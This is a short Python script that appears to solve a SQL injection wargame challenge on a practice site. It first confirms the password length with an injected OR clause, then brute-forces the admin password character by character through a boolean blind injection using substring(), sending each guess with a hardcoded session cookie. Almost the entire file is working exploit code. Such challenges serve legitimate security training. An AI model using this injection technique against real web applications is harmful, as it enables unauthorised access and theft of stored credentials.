#https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=%27%20||%20LENGTH(pw)=8;%23
#from there, we know that the length of the password is 8. We can brute-force this.
import requests
headers= {'Cookie':'PHPSESSID=iot1jl8tr5l94b3la52t54ps8k'}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
wordlist = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
# r = requests.get(url, headers=headers).text
solved=False
currletter = 1
password = ""
while not solved:
    for thing in wordlist:
        statement = f"?pw=%27%20||%20substring(pw,{currletter},1)=%27{thing}%27;%20%23"
        tempurl = url+statement
        r = requests.get(tempurl, headers=headers).text
        if r"<h2>Hello admin</h2><code>" in r:
            password+=thing
            currletter+=1
            print(thing)
    if len(password)==8:
        solved=True
print(password)

### NOT WORKING YET ###
### OK NVM NOW IT WORKS THEY CHANGED THE DAMN PASSWORD ###